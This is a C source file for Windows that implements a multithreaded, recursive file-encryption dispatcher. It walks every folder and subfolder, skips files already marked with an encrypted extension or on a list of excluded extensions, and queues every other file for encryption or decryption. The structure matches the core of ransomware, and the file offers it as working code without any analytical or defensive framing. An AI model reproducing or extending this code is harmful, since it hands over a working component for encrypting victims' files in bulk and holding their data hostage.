#include <Windows.h>
#include "config.h"
#include "memutils.h"
#include "stringutils.h"
#include "threadpool.h"


extern void    EncryptSingleFile(LPCWSTR wPath);
extern void    DecryptSingleFile(LPCWSTR wPath);
extern BOOL    IsBlacklistedExtension(LPCWSTR wFileName);

// create the pool, set min/max threads, wire up cleanup group & env
static BOOL ThreadPoolState_Init(TP_STATE* tpState) {
    if (!tpState) return FALSE;

    InitializeThreadpoolEnvironment(&tpState->Env);

    if (!(tpState->Cleanup = CreateThreadpoolCleanupGroup()))
        return FALSE;

    if (!(tpState->Pool = CreateThreadpool(NULL)))
        return FALSE;

    SetThreadpoolCallbackPool(&tpState->Env, tpState->Pool);
    SetThreadpoolCallbackCleanupGroup(&tpState->Env, tpState->Cleanup, NULL);
    SetThreadpoolThreadMaximum(tpState->Pool, MAX_THREADS);
    SetThreadpoolThreadMinimum(tpState->Pool, 1);
    return TRUE;
}

// teardown in reverse order
static void ThreadPoolState_Destroy(TP_STATE* tpState) {
    if (!tpState) return;

    CloseThreadpoolCleanupGroupMembers(tpState->Cleanup, FALSE, NULL);
    CloseThreadpoolCleanupGroup(tpState->Cleanup);
    DestroyThreadpoolEnvironment(&tpState->Env);
    CloseThreadpool(tpState->Pool);
}

// callback for each file: just encrypt or decrypt and free the params
VOID CALLBACK FileWorkerTP(PTP_CALLBACK_INSTANCE ptpInstance, PVOID pContext, PTP_WORK ptpWork) {
    THREAD_PARAMS* params = (THREAD_PARAMS*)pContext;

    if (params->Encrypt)
        EncryptSingleFile(params->Path);
    else
        DecryptSingleFile(params->Path);

    _heapfree(params);
}


// walk directory (non-recursive) and submit every matching file to the pool
static BOOL DispatchWorkersInDirectory(LPCWSTR wDir, BOOL bEncryptMode, PTP_CALLBACK_ENVIRON ptpEnviron) {
    WCHAR wPattern[MAX_PATH * 2];
    WIN32_FIND_DATAW wFindData;
    HANDLE hFind;
    BOOL bEncryptedFile = FALSE;
    THREAD_PARAMS* pParams = NULL;
    PTP_WORK ptpWork = NULL;

    _snprintfW(wPattern, MAX_PATH * 2, L"%s\\*", wDir);

    if ((hFind = FindFirstFileW(wPattern, &wFindData)) == INVALID_HANDLE_VALUE) {
#ifdef CONSOLE_STDOUT
        PRINT(L"[!] FindFirstFileW failed for %s\n", wDir);
#endif
        return FALSE;
    }

    do {      
        // skip subdirectoriess
        if (wFindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            continue;

        // skip already-encrypted or non-encrypted files based on EncryptMode
        bEncryptedFile = (_StrStrIW(wFindData.cFileName, ENCRYPT_EXT) != NULL);
        if ((bEncryptMode && bEncryptedFile) || (!bEncryptMode && !bEncryptedFile))
            continue;

        // skip blacklisted when encrypting
        if (bEncryptMode && IsBlacklistedExtension(wFindData.cFileName)) {
#ifdef CONSOLE_STDOUT
            PRINT(L"[!] Skipping blacklisted: %s\n", wFindData.cFileName);
#endif
            continue;
        }

        // allocate thread params
        if (!(pParams = (THREAD_PARAMS*)_heapalloc(sizeof(*pParams)))) {
#ifdef CONSOLE_STDOUT
            PRINT(L"[!] HeapAlloc failed for THREAD_PARAMS\n");
#endif
            continue;
        }

        // fill in params and submit
        _snprintfW(pParams->Path, MAX_PATH, L"%s\\%s", wDir, wFindData.cFileName);
        pParams->Encrypt = bEncryptMode;

        if (!(ptpWork = CreateThreadpoolWork(FileWorkerTP, pParams, ptpEnviron))) {
#ifdef CONSOLE_STDOUT
            PRINT(L"[!] Failed to create work item\n");
#endif
            _heapfree(pParams);
            continue;
        }
        SubmitThreadpoolWork(ptpWork);

    } while (FindNextFileW(hFind, &wFindData));

    FindClose(hFind);
    return TRUE;
}


// Sets up the pool, dispatches this folder, recurses, tears down
BOOL ParallelProcessDirectory(LPCWSTR wRootDir, BOOL  bEncryptMode) {
    TP_STATE tpState = { 0 };
    BOOL bDispatched = FALSE;

    if (!ThreadPoolState_Init(&tpState))
        return FALSE;

    // first, dispatch all files in root directory
    bDispatched = DispatchWorkersInDirectory(wRootDir, bEncryptMode, &tpState.Env);

    // then recurse into each subdirectory
    {
        WCHAR         wPattern[MAX_PATH * 2];
        WIN32_FIND_DATAW wFindData;
        HANDLE        hFind;

        _snprintfW(wPattern, MAX_PATH * 2, L"%s\\*", wRootDir);

        if ((hFind = FindFirstFileW(wPattern, &wFindData)) != INVALID_HANDLE_VALUE){
            do {
                if ((wFindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
                    _wcscmp(wFindData.cFileName, L".") != 0 &&
                    _wcscmp(wFindData.cFileName, L"..") != 0)
                {
                    WCHAR wSubDir[MAX_PATH * 2];
                    _snprintfW(wSubDir, MAX_PATH * 2, L"%s\\%s", wRootDir, wFindData.cFileName);
                    if (ParallelProcessDirectory(wSubDir, bEncryptMode))
                        bDispatched = TRUE;
                }
            } while (FindNextFileW(hFind, &wFindData));
            FindClose(hFind);
        }
    }

    ThreadPoolState_Destroy(&tpState);
    return bDispatched;
}
